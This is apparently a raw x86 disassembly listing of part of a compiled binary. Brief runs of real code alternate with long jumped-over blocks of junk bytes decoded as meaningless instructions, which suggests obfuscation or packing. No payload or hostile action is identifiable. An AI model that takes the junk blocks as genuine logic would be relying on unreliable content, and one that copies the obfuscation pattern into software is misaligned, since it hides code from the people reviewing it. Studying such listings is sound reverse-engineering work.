  402150:	mov    eax,DWORD PTR [ebp-0x18]
  402153:	add    eax,0xaa
  402158:	jmp    0x4022f9
  40215d:	cmc    
  40215e:	dec    ebx
  40215f:	and    eax,0x7570a1be
  402164:	jno    0x402191
  402166:	push   ds
  402167:	mov    ch,0x76
  402169:	push   ebp
  40216a:	fadd   st(7),st
  40216c:	dec    ebp
  40216d:	push   ds
  40216e:	add    bh,BYTE PTR [esi+0x7e]
  402171:	cli    
  402172:	jg     0x4021f2
  402174:	jle    0x4021e7
  402176:	mov    al,ds:0xb805c6b5
  40217b:	pop    esi
  40217c:	xor    BYTE PTR [edx+0x12],dl
  40217f:	jnp    0x57f65d36
  402185:	imul   esi,DWORD PTR [ecx-0x60],0xe1ba3347
  40218c:	adc    DWORD PTR ds:0x380931cd,0xffffff8d
  402193:	(bad)  
  402195:	call   0xbe8c0e7d
  40219a:	call   0x3bd3dfd0
  40219f:	popa   
  4021a0:	leave  
  4021a1:	repz and al,0xbf
  4021a4:	jnp    0x402192
  4021a6:	lea    esp,[ebp-0x5600884c]
  4021ac:	fs dec esp
  4021ae:	xchg   ebx,eax
  4021af:	std    
  4021b0:	inc    ecx
  4021b1:	push   esp
  4021b2:	push   ebp
  4021b3:	add    BYTE PTR [eax-0x343f23e2],0x59
  4021ba:	clc    
  4021bb:	adc    bl,BYTE PTR [ecx]
  4021bd:	clc    
  4021be:	mov    edi,0x64ca7c76
  4021c3:	lods   eax,DWORD PTR ds:[esi]
  4021c4:	inc    ebp
  4021c5:	ins    BYTE PTR es:[edi],dx
  4021c6:	add    ah,bh
  4021c8:	add    DWORD PTR [edi-0x9df20f1],0x98db5909
  4021d2:	rol    BYTE PTR [ebp-0x6b],1
  4021d5:	lods   al,BYTE PTR ds:[esi]
  4021d6:	mov    ebx,0x1bf829f1
  4021db:	daa    
  4021dc:	add    ah,BYTE PTR [ebx]
  4021de:	dec    esp
  4021df:	stos   DWORD PTR es:[edi],eax
  4021e0:	pop    ss
  4021e1:	mov    al,0xdf
  4021e3:	add    al,0x26
  4021e5:	out    dx,al
  4021e6:	imul   ecx,DWORD PTR [edx],0x3a
  4021e9:	xchg   ebp,eax
  4021ea:	aam    0x9f
  4021ec:	mov    cl,BYTE PTR [edx-0x3c]
  4021ef:	aam    0x95
  4021f1:	test   BYTE PTR [edi-0x64f9748b],bl
  4021f7:	mov    cl,0xcd
  4021f9:	in     eax,dx
  4021fa:	push   esi
  4021fb:	or     al,0xf6
  4021fd:	mov    eax,ds:0xabebffc9
  402202:	out    dx,al
  402203:	rcl    ebx,0x8d
  402206:	pop    edi
  402207:	scas   al,BYTE PTR es:[edi]
  402208:	xchg   ebp,eax
  402209:	in     al,dx
  40220a:	add    al,0xae
  40220c:	mov    ah,0x8a
  40220e:	mov    esp,0x863f41f7
  402213:	enter  0x2c68,0xb1
  402217:	and    ecx,DWORD PTR [esi-0x419fef74]
  40221d:	outs   dx,DWORD PTR ds:[esi]
  40221e:	sub    al,0xc0
  402220:	jg     0x40226a
  402222:	popf   
  402223:	push   edx
  402224:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402225:	mov    ah,0x3
  402227:	fstp   DWORD PTR [ebp+0x2f]
  40222a:	mov    DWORD PTR [edi],0xfad1518e
  402230:	das    
  402231:	pop    edx
  402232:	adc    dl,BYTE PTR [ecx+ebp*4]
  402235:	fcmovu st,st(5)
  402237:	bound  ebx,QWORD PTR [esp+ebp*8]
  40223a:	das    
  40223b:	or     ebp,esp
  40223d:	sub    BYTE PTR [ebp+0x5],bl
  402240:	sub    eax,0x75abae9f
  402245:	jl     0x40220e
  402247:	ins    DWORD PTR es:[edi],dx
  402248:	inc    esi
  402249:	dec    edi
  40224a:	aam    0x84
  40224c:	aas    
  40224d:	(bad)  
  40224e:	rol    BYTE PTR [ebp+0x7180df24],1
  402254:	cmp    DWORD PTR [ebp-0xa45c9d4],ebx
  40225a:	pop    ebp
  40225b:	cmp    al,0x39
  40225d:	mov    cl,0xc
  40225f:	mov    esi,0x21ad7ff1
  402264:	sub    ebp,0x98fa36f2
  40226a:	repz adc ch,bh
  40226d:	fist   DWORD PTR [ebp-0x5c]
  402270:	dec    edx
  402271:	popa   
  402272:	jmp    0x40227f
  402274:	loop   0x40225b
  402276:	jle    0x4022ad
  402278:	inc    ebx
  402279:	pusha  
  40227a:	add    ah,BYTE PTR [esi-0x379e1add]
  402280:	sub    dh,BYTE PTR [ebx+0x3b]
  402283:	add    eax,DWORD PTR ds:0x7759a226
  402289:	xchg   edi,eax
  40228a:	push   edi
  40228b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40228c:	xchg   ecx,eax
  40228d:	push   0x412938b2
  402292:	mov    bh,0xcd
  402294:	mov    al,BYTE PTR [edx]
  402296:	dec    ebp
  402297:	mov    dl,0xa4
  402299:	inc    ebx
  40229a:	ud0    edi,edi
  40229d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40229e:	in     eax,dx
  40229f:	pop    eax
  4022a0:	and    esp,DWORD PTR [edi+ebp*4-0x6e8d7a41]
  4022a7:	mov    edi,esi
  4022a9:	leave  
  4022aa:	dec    ebx
  4022ab:	aaa    
  4022ac:	push   ebx
  4022ad:	(bad)  
  4022ae:	xlat   BYTE PTR ds:[ebx]
  4022af:	mov    dl,0x3d
  4022b1:	xor    edi,DWORD PTR [edx+0x27]
  4022b4:	cmp    bl,al
  4022b6:	scas   eax,DWORD PTR es:[edi]
  4022b7:	or     BYTE PTR [edx+0x5a],dl
  4022ba:	sub    al,0x2
  4022bc:	dec    esi
  4022bd:	pop    eax
  4022be:	push   DWORD PTR es:[esp+eiz*8-0x17b955ea]
  4022c6:	icebp  
  4022c7:	ret    0x904e
  4022ca:	xchg   ecx,eax
  4022cb:	mov    eax,edi
  4022cd:	fldcw  WORD PTR [ebp-0x13]
  4022d0:	mov    bl,0xc3
  4022d2:	xchg   edi,eax
  4022d3:	lahf   
  4022d4:	sub    dh,dh
  4022d6:	cmp    dh,cl
  4022d8:	rcr    ebx,0x61
  4022db:	lea    ebp,[eax+0x32]
  4022de:	and    ecx,eax
  4022e0:	(bad)  
  4022e1:	inc    DWORD PTR [edi+0x5fe99a11]
  4022e7:	xchg   ecx,eax
  4022e8:	and    dl,BYTE PTR [ecx-0x146a58bc]
  4022ee:	in     al,0x59
  4022f0:	fild   WORD PTR [ecx]
  4022f2:	xchg   ebp,eax
  4022f3:	mov    dl,0x5e
  4022f5:	outs   dx,BYTE PTR ds:[esi]
  4022f6:	fild   WORD PTR [edi]
  4022f8:	fist   WORD PTR [eax-0x75]
  4022fb:	inc    ebp
  4022fc:	call   0x1d8a38c
  402301:	add    BYTE PTR [eax],al
  402303:	push   DWORD PTR [eax]
  402305:	call   0x40984d
  40230a:	mov    DWORD PTR [ebp-0x4],eax
  40230d:	cmp    DWORD PTR [ebp-0x4],0x0
  402311:	lea    eax,[ebp+0x4]
  402314:	mov    DWORD PTR [ebp-0x38],eax
  402317:	je     0x40313f
  40231d:	lea    eax,[ebp-0xc]
  402320:	mov    DWORD PTR [ebp-0x30],eax
  402323:	mov    eax,DWORD PTR [ebp-0x4c]
  402326:	xor    eax,esi
  402328:	add    eax,edi
  40232a:	mov    DWORD PTR [ebp-0x34],eax
  40232d:	mov    eax,DWORD PTR [ebp-0x28]
  402330:	xor    eax,esi
  402332:	add    eax,edi
  402334:	mov    DWORD PTR [ebp-0x20],eax
  402337:	mov    eax,DWORD PTR [ebp-0x4]
  40233a:	mov    DWORD PTR [ebp-0x24],eax
  40233d:	lea    eax,[ebp-0x98]
  402343:	mov    DWORD PTR [ebp-0x8],eax
  402346:	jmp    0x4024e7
  40234b:	mov    ds:0x623e7a3a,al
  402350:	bound  esp,QWORD PTR ds:[edx-0x4a]
  402354:	fadd   DWORD PTR [ebp+0x4b]
  402357:	mov    edx,0x9a37aed4
  40235c:	add    edi,DWORD PTR [esi+0x7e]
  40235f:	cli    
  402360:	jg     0x4023e0
  402362:	jle    0x402344
  402364:	jecxz  0x4023b2
  402366:	jae    0x402344
  402368:	(bad)  
  402369:	adc    eax,0x3390a120
  40236e:	ficomp DWORD PTR es:[edi-0x6a]
  402372:	xchg   edi,eax
  402373:	inc    ebx
  402374:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402375:	out    0x13,al
  402377:	add    DWORD PTR [eax-0x4d],ebp
  40237a:	mov    ebx,0xe9a4cbca
  40237f:	sbb    BYTE PTR [ebx-0x20],dh
  402382:	push   es
  402383:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402384:	inc    eax
  402385:	repnz dec edi
  402387:	imul   al
  402389:	cmp    ebp,ebp
  40238b:	test   al,0xdb
  40238d:	xor    BYTE PTR [edx],cl
  40238f:	or     al,0x39
  402391:	jae    0x4023da
  402393:	stos   DWORD PTR es:[edi],eax
  402394:	ficomp DWORD PTR [eax+0x37]
  402397:	xor    eax,DWORD PTR [ecx-0x1e]
  40239a:	cwde   
  40239b:	inc    ebx
  40239c:	dec    eax
  40239d:	dec    esp
  40239e:	fwait
  40239f:	jmp    0xc2b4:0x8df1e4a
  4023a6:	pop    es
  4023a7:	pop    esi
  4023a8:	cld    
  4023a9:	and    BYTE PTR [eax+ecx*8-0x50],dl
  4023ad:	adc    cl,BYTE PTR [eax]
  4023af:	mov    WORD PTR [ebp+0x47],cs
  4023b2:	xchg   ecx,eax
  4023b3:	or     eax,DWORD PTR [ecx]
  4023b5:	fist   WORD PTR [edx+0x4a]
  4023b8:	paddusb mm3,QWORD PTR [edi+0x76]
  4023bc:	sbb    esp,DWORD PTR [ecx]
  4023be:	imul   ecx,DWORD PTR [edx],0xda15a6da
  4023c4:	popa   
  4023c5:	adc    BYTE PTR [ecx],ch
  4023c7:	inc    esp
  4023c8:	add    esp,DWORD PTR [eax+0x3b]
  4023cb:	jmp    0x4927:0x38fa15cd
  4023d2:	enter  0x4438,0x1f
  4023d6:	cwde   
  4023d7:	or     al,0xbf
  4023d9:	in     eax,0x9c
  4023db:	hlt    
  4023dc:	mov    BYTE PTR [ebx+0x3b],bh
  4023df:	add    eax,0x27baea3d
  4023e4:	inc    edx
  4023e5:	dec    edi
  4023e6:	pop    edi
  4023e7:	mov    ch,0xc8
  4023e9:	in     eax,0xb5
  4023eb:	shr    DWORD PTR [eax],0xec
  4023ee:	fmul   DWORD PTR [esi-0x6e]
  4023f1:	push   0x8aca7a2
  4023f6:	lock sub edi,DWORD PTR es:0x9fdbad0
  4023fe:	clc    
  4023ff:	inc    edx
  402400:	in     eax,0x8c
  402402:	or     DWORD PTR [eax],esi
  402404:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402405:	scas   eax,DWORD PTR es:[edi]
  402406:	sub    ecx,DWORD PTR [edi-0x12]
  402409:	pop    edx
  40240a:	sub    bh,bl
  40240c:	in     eax,0x30
  40240e:	push   eax
  40240f:	sbb    DWORD PTR [ebx-0x71],eax
  402412:	mov    dl,0xc0
  402414:	ret    
  402415:	mov    WORD PTR [ecx-0x53],ss
  402418:	call   0x2df:0x7180bedd
  40241f:	das    
  402420:	pop    edx
  402421:	push   ecx
  402422:	daa    
  402423:	xor    DWORD PTR [edi+0x6f5eb84],ebx
  402429:	jno    0x4023e8
  40242b:	cmp    dl,BYTE PTR [edi+eax*2]
  40242e:	cmp    eax,0xb9c9fd28
  402433:	std    
  402434:	imul   ebx,eax,0xffffffe7
  402437:	inc    esp
  402438:	xchg   esp,eax
  402439:	jmp    0x402458
  40243b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40243c:	mov    WORD PTR [esi+0x43],ss
  40243f:	test   al,0x46
  402441:	mov    edx,0x319ff3a
  402446:	pushf  
  402447:	mov    bl,0x6b
  402449:	push   cs
  40244a:	adc    eax,0x812b4d5a
  40244f:	cdq    
  402450:	mov    eax,ds:0x95f5954b
  402455:	and    BYTE PTR gs:[ebx+0x31],0x37
  40245a:	in     eax,0x42
  40245c:	xchg   ebp,eax
  40245d:	aam    0xbb
  40245f:	out    dx,al
  402460:	popf   
  402461:	stos   BYTE PTR es:[edi],al
  402462:	inc    ebp
  402463:	les    edx,FWORD PTR [ebp-0x3e9058bd]
  402469:	mov    ebp,0x5b6e0943
  40246e:	adc    al,0xb0
  402470:	mov    cl,0x62
  402472:	mov    dl,0x42
  402474:	sub    BYTE PTR [edi+eax*2+0x61a7ea80],ah
  40247b:	jb     0x4024db
  40247d:	jge    0x4024e7
  40247f:	hlt    
  402480:	mov    edx,0x2540a5a8
  402485:	arpl   WORD PTR [esi+0x58],bx
  402488:	repz pop ds
  40248a:	nop
  40248b:	mov    ds:0x9b11065d,eax
  402490:	popa   
  402491:	fcmove st,st(5)
  402493:	dec    BYTE PTR [edi+0x11]
  402496:	pop    edi
  402497:	fwait
  402498:	out    0xe2,eax
  40249a:	adc    DWORD PTR [edx-0xd],ecx
  40249d:	mov    ebp,0x3189438a
  4024a2:	pop    esi
  4024a3:	addr16 out 0x1b,eax
  4024a6:	add    eax,ecx
  4024a8:	sbb    ch,BYTE PTR [edi+edx*4+0x1f]
  4024ac:	icebp  
  4024ad:	mov    bl,0xa4
  4024af:	and    dl,bh
  4024b1:	cmp    eax,0x5ec72a5a
  4024b6:	lds    edx,FWORD PTR [edi+0x7eb0e207]
  4024bc:	loope  0x402449
  4024be:	dec    ecx
  4024bf:	push   ecx
  4024c0:	lahf   
  4024c1:	xor    al,0xc
  4024c3:	inc    eax
  4024c4:	js     0x4024ad
  4024c6:	lods   eax,DWORD PTR ds:[esi]
  4024c7:	and    dl,bl
  4024c9:	xor    bl,bh
  4024cb:	add    edi,DWORD PTR [ebx-0x12f89de]
  4024d1:	adc    BYTE PTR es:[ecx+edi*1-0x19c23e4d],ah
  4024d9:	and    al,0x4f
  4024db:	je     0x402466
  4024dd:	add    BYTE PTR [edx-0x2f],0x15
  4024e1:	push   esi
  4024e2:	int3   
  4024e3:	add    al,0x52
  4024e5:	lds    ecx,FWORD PTR [ebx]
  4024e7:	mov    eax,DWORD PTR [ebp-0x10]
  4024ea:	mov    DWORD PTR [ebp-0x10],eax
  4024ed:	mov    eax,DWORD PTR [ebp-0x1c]
  4024f0:	mov    DWORD PTR [ebp-0x40],ebx
  4024f3:	mov    DWORD PTR [ebp-0x2c],eax
  4024f6:	mov    eax,DWORD PTR [ebp-0x40]
  4024f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4024fc:	jmp    0x40269d
  402501:	push   ebp
  402502:	shl    BYTE PTR [ebp+0x7159b138],1
  402508:	push   ecx
  402509:	stos   DWORD PTR es:[edi],eax
  40250a:	rol    eax,0x47
  40250d:	xor    eax,0x26903383
  402512:	add    DWORD PTR [esi+0x7e],edi
  402515:	cli    
  402516:	jg     0x402596
  402518:	jle    0x402516
  40251a:	xchg   ecx,eax
  40251b:	(bad)  
  40251e:	jge    0x4024c9
  402520:	aam    0x66
  402522:	fmulp  st(6),st
  402524:	loope  0x402577
  402526:	outs   dx,BYTE PTR ds:[esi]
  402527:	push   edi
  402528:	in     eax,dx
  402529:	daa    
  40252a:	xchg   dl,bh
  40252c:	ins    DWORD PTR es:[edi],dx
  40252d:	fmulp  st(0),st
  40252f:	in     eax,0xd7
  402531:	cmp    BYTE PTR [edi-0x1b9d21f],dh
  402537:	sub    eax,0x51745bb7
  40253c:	inc    esp
  40253d:	push   cs
  40253e:	shr    DWORD PTR [edi-0x21],0x74
  402542:	gs dec ebp
  402544:	add    ah,BYTE PTR [ebp+0x706740a6]
  40254a:	je     0x40254a
  40254c:	fadd   DWORD PTR [edx*8+0x2e1e99c4]
  402553:	pop    ebp
  402554:	jmp    0x1215:0x51c14647
  40255b:	outs   dx,BYTE PTR ds:[esi]
  40255c:	mov    edx,0xf81c03
  402561:	mov    bl,0x89
  402563:	pop    esi
  402564:	push   edx
  402565:	push   esi
  402566:	push   cs
  402567:	enter  0xfc27,0xb5
  40256b:	dec    edx
  40256c:	scas   al,BYTE PTR es:[edi]
  40256d:	pop    ecx
  40256e:	push   ebx
  40256f:	and    al,0xf6
  402571:	es into 
  402573:	out    0x3e,al
  402575:	enter  0x9182,0x46
  402579:	mov    dh,0xc2
  40257b:	loopne 0x402549
  40257d:	sahf   
  40257e:	push   ds
  40257f:	mov    eax,ds:0xebae573d
  402584:	fidiv  DWORD PTR [edi]
  402586:	push   0x22
  402588:	stos   BYTE PTR es:[edi],al
  402589:	adc    eax,0x67b0d442
  40258e:	data16 loope 0x402556
  402591:	mov    al,0xf4
  402593:	add    bh,ah
  402595:	hlt    
  402596:	inc    edx
  402597:	test   al,0x48
  402599:	xor    ebp,0xffffffd9
  40259c:	mov    ch,0x6f
  40259e:	popa   
  40259f:	adc    eax,0xa61577e
  4025a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025a6:	and    bl,BYTE PTR [edi]
  4025a8:	push   edi
  4025a9:	data16 mov BYTE PTR [eax-0x72],cl
  4025ad:	jne    0x40257c
  4025af:	ret    
  4025b0:	jecxz  0x4025f5
  4025b2:	cmp    esp,esp
  4025b4:	sub    ch,ah
  4025b6:	and    BYTE PTR [ebp+0x1bcd870b],ch
  4025bc:	jo     0x40262c
  4025be:	or     BYTE PTR [edx-0x7a],0xbd
  4025c2:	lds    eax,FWORD PTR [edi+ebp*4]
  4025c5:	xchg   esp,eax
  4025c6:	fiadd  WORD PTR [edi]
  4025c8:	pop    es
  4025c9:	imul   eax,DWORD PTR [edi+0x2aa1d6b3],0x1e141bc2
  4025d3:	xor    DWORD PTR [ebp+0x66],esp
  4025d6:	cmp    al,0x4b
  4025d8:	shl    esi,0x97
  4025db:	ss jl  0x4025aa
  4025de:	test   BYTE PTR [eax],bh
  4025e0:	scas   al,BYTE PTR es:[edi]
  4025e1:	jp     0x40261d
  4025e3:	lea    ecx,[ebx+ebx*2-0x7af69f19]
  4025ea:	push   ecx
  4025eb:	xchg   ecx,eax
  4025ec:	pushf  
  4025ed:	mov    esi,0x786d1b95
  4025f2:	cs push edi
  4025f4:	sub    esp,ecx
  4025f6:	dec    edi
  4025f7:	call   0x57c3d70b
  4025fc:	aad    0x4e
  4025fe:	out    0x19,al
  402600:	cli    
  402601:	scas   eax,DWORD PTR es:[edi]
  402602:	push   edi
  402603:	sbb    dh,bh
  402605:	xchg   ebx,eax
  402606:	mov    ?,ebx
  402608:	aaa    
  402609:	dec    edx
  40260a:	(bad)  
  40260c:	dec    ebx
  40260d:	push   eax
  40260e:	js     0x402675
  402610:	add    BYTE PTR [edi+0x566312d1],cl
  402616:	cmp    ch,bl
  402618:	shl    DWORD PTR [ebx+0x66],1
  40261b:	push   edx
  40261c:	sbb    ecx,DWORD PTR ds:0xc5b4b84f
  402622:	mov    ebp,0x9a3b0afc
  402627:	addr16 and ebp,esi
  40262a:	retf   0xdf5f
  40262d:	out    0xb1,eax
  40262f:	mov    esp,0x5a7e4a91
  402634:	jmp    0x816a:0x87a3ab8b
  40263b:	lods   al,BYTE PTR ds:[esi]
  40263c:	xchg   BYTE PTR [eax],ah
  40263e:	test   esi,eax
  402640:	adc    eax,0x21cb6009
  402645:	std    
  402646:	mov    ecx,0x4c6858fd
  40264b:	mov    dl,0x97
  40264d:	jae    0x402658
  40264f:	out    0x20,al
  402651:	jnp    0x402615
  402653:	inc    BYTE PTR [ebx-0x5f]
  402656:	loop   0x402634
  402658:	push   cs
  402659:	mov    al,ds:0x293e1f8c
  40265e:	fucom  st(3)
  402660:	mov    al,0xca
  402662:	mov    esp,0xcefaef16
  402667:	mov    bh,0xb1
  402669:	adc    al,0x50
  40266b:	pop    esp
  40266c:	sub    BYTE PTR [esi+esi*2],dl
  40266f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402670:	test   al,0x9b
  402672:	in     eax,dx
  402673:	pop    edi
  402674:	dec    ebp
  402675:	in     al,0xa0
  402677:	dec    esp
  402678:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402679:	or     dl,0xf2
  40267c:	popa   
  40267d:	iret   
  40267e:	adc    dl,dl
  402680:	sbb    dl,BYTE PTR [ecx+0x42dbb781]
  402686:	fild   QWORD PTR [edi-0x3b]
  402689:	add    al,BYTE PTR [edi]
  40268b:	imul   ecx,DWORD PTR [ecx+ebx*8-0x476e691b],0xc0b49830
  402696:	out    dx,al
  402697:	dec    esi
  402698:	loopne 0x402673
  40269a:	fstp   QWORD PTR [ecx+0x5c633c1]
  4026a0:	fwait
  4026a1:	jb     0x4026d5
  4026a3:	add    BYTE PTR [ecx-0x23ba74ff],cl
  4026a9:	mov    ecx,DWORD PTR [ebp-0x8]
  4026ac:	mov    DWORD PTR [ecx+0x4],eax
  4026af:	mov    eax,DWORD PTR [ebp-0x20]
  4026b2:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b5:	mov    DWORD PTR [ecx+0x8],eax
  4026b8:	mov    eax,DWORD PTR [ebp-0x34]
  4026bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4026be:	mov    DWORD PTR [ecx+0xc],eax
  4026c1:	jmp    0x402862
  4026c6:	les    ecx,FWORD PTR [eax+0x5552d502]
  4026cc:	ror    DWORD PTR [ecx-0x7d59e5d1],1
  4026d2:	mov    edx,0xa259536a
  4026d7:	push   cs
  4026d8:	jle    0x402758
  4026da:	cli    
  4026db:	jg     0x40275b
  4026dd:	jle    0x402673
  4026df:	mov    bl,0x4e
  4026e1:	or     BYTE PTR [ebx],cl
  4026e3:	sbb    DWORD PTR [ebp+0x30],0x922981b2
  4026ea:	xor    bl,BYTE PTR [eax+eiz*2+0x79]
  4026ee:	xor    eax,0x53df989
  4026f3:	(bad)  
  4026f4:	push   esi
  4026f5:	shr    DWORD PTR [ebx-0x80],0xca
  4026f9:	int3   
  4026fa:	mov    ecx,0xd199fd9f
  4026ff:	push   0xffffffbf
  402701:	cld    
  402702:	cmp    al,0x82
  402704:	ret    
  402705:	xchg   BYTE PTR [ecx+0x17],ah
  402708:	dec    edx
  402709:	add    BYTE PTR [edi],cl
  40270b:	fisttp DWORD PTR [edx+0x633755c5]
  402711:	jl     0x402732
  402713:	adc    DWORD PTR [edi+edi*1+0x54],edx
  402717:	mov    bh,0x73
  402719:	or     DWORD PTR [ecx+0x4878059d],esp
  40271f:	xchg   ebx,eax
  402720:	out    dx,al
  402721:	push   ecx
  402722:	xlat   BYTE PTR ds:[ebx]
  402723:	mov    edx,0xdc849bb4
  402728:	cli    
  402729:	jl     0x402787
  40272b:	jb     0x402770
  40272d:	push   esi
  40272e:	in     al,dx
  40272f:	aam    0xda
  402731:	dec    edi
  402732:	add    dh,ch
  402734:	mov    ecx,0x675bc74b
  402739:	pop    edx
  40273a:	sti    
  40273b:	fwait
  40273c:	stos   DWORD PTR es:[edi],eax
  40273d:	enter  0xdd6b,0x17
  402741:	pop    ebx
  402742:	jno    0x4026ee
  402744:	push   cs
  402745:	bound  eax,QWORD PTR [edx]
  402747:	out    0x9b,al
  402749:	or     ecx,edi
  40274b:	daa    
  40274c:	popf   
  40274d:	rcr    DWORD PTR [edi-0x76],cl
  402750:	mov    WORD PTR ds:0xccbce094,gs
  402756:	and    bl,BYTE PTR [ebx+0x3979d1a8]
  40275c:	mov    bl,0x16
  40275e:	mov    bl,0xe6
  402760:	pop    ebx
  402761:	and    al,0x9
  402763:	push   cs
  402764:	inc    esi
  402765:	sub    BYTE PTR [ebx],dl
  402767:	pop    ss
  402768:	hlt    
  402769:	mov    ecx,0x3b1193a1
  40276e:	in     al,dx
  40276f:	xlat   BYTE PTR ds:[ebx]
  402770:	popa   
  402771:	mov    ch,0x81
  402773:	(bad)  
  402774:	(bad)  
  402776:	rol    BYTE PTR [ebx-0x3cff8aa5],0xf1
  40277d:	mov    bl,0x69
  40277f:	scas   al,BYTE PTR es:[edi]
  402780:	push   ecx
  402781:	arpl   WORD PTR [eax-0x4b],ax
  402784:	into   
  402785:	sahf   
  402786:	sub    eax,0xd5730b7c
  40278b:	outs   dx,DWORD PTR ds:[esi]
  40278c:	xchg   DWORD PTR [esi+edi*8-0x6f6ac64],ecx
  402793:	pop    esi
  402794:	adc    BYTE PTR [ebp+0x54dea9d3],cl
  40279a:	js     0x402748
  40279c:	inc    ebp
  40279d:	and    esp,ebx
  40279f:	cmp    DWORD PTR [ebx],ecx
  4027a1:	ss add al,0xf0
  4027a4:	push   ds
  4027a5:	dec    ebp
  4027a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027a7:	cmp    DWORD PTR [esi],esp
  4027a9:	mov    WORD PTR [ecx-0x22],es
  4027ac:	in     eax,0xc9
  4027ae:	jmp    0x4027e2
  4027b0:	pop    ecx
  4027b1:	add    eax,0x27c7abd7
  4027b6:	jo     0x40277f
  4027b8:	mov    bl,BYTE PTR [esi]
  4027ba:	scas   eax,DWORD PTR es:[edi]
  4027bb:	or     ebx,esi
  4027bd:	xchg   bl,dl
  4027bf:	test   ebx,0x302d59d5
  4027c5:	imul   edx,DWORD PTR [ebx+0x4d5ca47a],0xffffffaf
  4027cc:	push   esi
  4027cd:	jns    0x4027e9
  4027cf:	sub    al,0xdc
  4027d1:	leave  
  4027d2:	cld    
  4027d3:	(bad)  
  4027d5:	fsubr  DWORD PTR [esi-0xeed4fc4]
  4027db:	sbb    cl,BYTE PTR [ebp*2-0x5f1affd3]
  4027e2:	xor    al,0xd3
  4027e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027e5:	fdivr  QWORD PTR [esi+0x6db032fa]
  4027eb:	imul   ecx,DWORD PTR [edi+ecx*4-0x23f9cc61],0xc839cd2c
  4027f6:	cmp    eax,0xf44513b4
  4027fb:	inc    ecx
  4027fc:	fs stos DWORD PTR es:[edi],eax
  4027fe:	cmp    eax,0xe171e953
  402803:	clc    
  402804:	inc    ebx
  402805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402806:	sub    eax,0x684a6ba8
  40280b:	scas   eax,DWORD PTR es:[edi]
  40280c:	enter  0x8c41,0x6c
  402810:	add    eax,0xec4ee5c7
  402815:	jmp    0x40283b
  402817:	xor    eax,0x9f9c14ab
  40281c:	push   ss
  40281d:	jmp    0x7343ba18
  402822:	push   ebx
  402823:	out    dx,al
  402824:	fimul  WORD PTR [ebx]
  402826:	out    dx,eax
  402827:	jns    0x4027be
  402829:	cmovnp esp,edi
  40282c:	and    ebx,0xffffff8e
  40282f:	stos   BYTE PTR es:[edi],al
  402830:	in     al,dx
  402831:	ret    
  402832:	xor    BYTE PTR [ecx],cl
  402834:	rcr    BYTE PTR [esi-0x50db8ab2],0x36
  40283b:	or     eax,0x9b0cbe18
  402840:	inc    eax
  402841:	aas    
  402842:	pop    edi
  402843:	es cmp eax,0x3836da32
  402849:	pop    ss
  40284a:	or     bh,dl
  40284c:	push   0xdf55cb50
  402851:	sar    BYTE PTR [esi],1
  402853:	xor    eax,0x1ba80c2b
  402858:	add    DWORD PTR [edi],ebx
  40285a:	das    
  40285b:	jl     0x4028c2
  40285d:	loop   0x402875
  40285f:	sti    
  402860:	gs push edi
  402862:	mov    eax,DWORD PTR [ebp-0x30]
  402865:	mov    ecx,DWORD PTR [ebp-0x8]
  402868:	mov    DWORD PTR [ecx+0x10],eax
  40286b:	mov    eax,eax
  40286d:	mov    eax,DWORD PTR [ebp-0x24]
  402870:	test   eax,eax
  402872:	jmp    0x402a13
  402877:	inc    edi
  402878:	push   eax
  402879:	jnp    0x402883
  40287b:	or     DWORD PTR [ecx+0x55],edx
  40287e:	push   ecx
  40287f:	adc    BYTE PTR [ebx],ch
  402881:	nop
  402882:	dec    esp
  402883:	push   edx
  402884:	push   ebp
  402885:	scas   al,BYTE PTR es:[edi]
  402886:	aas    
  402887:	cs or  al,0x7e
  40288a:	jle    0x402886
  40288c:	jg     0x40290c
  40288e:	jle    0x402836
  402890:	test   BYTE PTR [edx-0x7c6ebbc7],al
  402896:	jmp    0xad51:0xda13c291
  40289d:	cwde   
  40289e:	(bad)  
  40289f:	call   0xa7711266
  4028a4:	inc    ebx
  4028a5:	stc    
  4028a6:	ror    BYTE PTR [edi+0x7b],0x41
  4028aa:	sbb    eax,0xe9e7e2fe
  4028af:	out    dx,eax
  4028b0:	cmp    BYTE PTR ds:0x63a1ab6f,cl
  4028b6:	mov    eax,ds:0xdf14b507
  4028bb:	pop    edi
  4028bc:	jno    0x40292e
  4028be:	int    0xb4
  4028c0:	xchg   esp,eax
  4028c1:	(bad)  
  4028c2:	dec    BYTE PTR [ebx]
  4028c4:	push   ds
  4028c5:	sar    al,0x8c
  4028c8:	mov    ah,0xe6
  4028ca:	sbb    DWORD PTR fs:[edx],ecx
  4028cd:	mov    ch,dl
  4028cf:	jp     0x402861
  4028d1:	xlat   BYTE PTR ds:[ebx]
  4028d2:	jmp    0x6e19:0xa72431e7
  4028d9:	bound  eax,QWORD PTR [edi-0x4b5880f]
  4028df:	not    DWORD PTR [ecx]
  4028e1:	xchg   esp,eax
  4028e2:	(bad)  
  4028e3:	sub    al,0x65
  4028e5:	xor    al,0xdc
  4028e7:	retf   
  4028e8:	inc    eax
  4028e9:	int    0x2c
  4028eb:	aas    
  4028ec:	ja     0x402895
  4028ee:	jge    0x4028ac
  4028f0:	xlat   BYTE PTR ds:[ebx]
  4028f1:	(bad)
  4028f5:	rcl    BYTE PTR [ecx+0x71c94ddd],0xfc
  4028fc:	in     eax,0x5f
  4028fe:	pop    edx
  4028ff:	mov    cl,0xf4
  402901:	jmp    0x9a8a21e3
  402906:	mov    al,ds:0x4f3cee7f
  40290b:	sub    ecx,edx
  40290d:	pop    ebx
  40290e:	jle    0x4028f5
  402910:	and    DWORD PTR ds:0x624a6371,edi
